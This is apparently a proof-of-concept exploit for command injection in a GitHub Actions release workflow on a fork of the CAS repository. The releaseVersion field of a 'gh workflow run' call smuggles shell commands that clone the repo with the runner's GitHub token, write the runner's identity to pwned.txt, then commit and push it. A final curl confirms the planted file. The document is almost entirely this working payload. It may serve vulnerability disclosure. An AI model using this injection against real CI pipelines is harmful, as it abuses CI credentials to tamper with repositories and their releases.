gh workflow run release.yml \                                                                                                                                                                                                                     
    --repo n0n4m3x41/cas \                                                                                                                                                                                                                          
    --ref master \                                                                                                                                                                                                                                  
    --field releaseVersion='7.2.0" && git clone https://x-access-token:$GITHUB...@github.com/n0n4m3x41/cas.git /tmp/c && echo "runner=$(id) host=$(hostname) date=$(date)" > /tmp/c/pwned.txt && git -C /tmp/c config user.email p...@test.com 

git -C /tmp/c config user.name poc && git -C /tmp/c add pwned.txt && git -C /tmp/c commit -m "pwned - injection poc" && git -C /tmp/c push && echo "' --field nextVersion='7.2.1-SNAPSHOT

curl https://github.com/n0n4m3x41/cas/blob/master/pwned.txt
